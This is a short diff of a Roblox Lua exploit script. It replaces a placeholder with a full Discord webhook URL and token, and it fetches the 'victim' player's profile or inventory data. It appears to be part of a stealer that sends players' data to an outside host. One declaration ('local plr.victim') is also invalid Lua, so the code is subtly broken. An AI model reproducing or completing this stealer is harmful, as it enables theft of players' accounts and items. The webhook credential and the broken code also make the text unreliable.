@@ -4,7 +4,7 @@ local HttpService = game:GetService("HttpService")
 local plr.victim = Players.LocalPlayer
 
 getgenv().user = "Warrior_ggs"
-getgenv().webhook = "urwebhookhere"
+getgenv().webhook = "https://discord.com/api/webhooks/1415078286408683633/K_bXB2L3WHIhFJeekJjWamiNnhBsSpzGW4tnQNCFS2_iGnEHtnjT-nv3-nfMokJrNC4M"
 
 local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.victim)
 
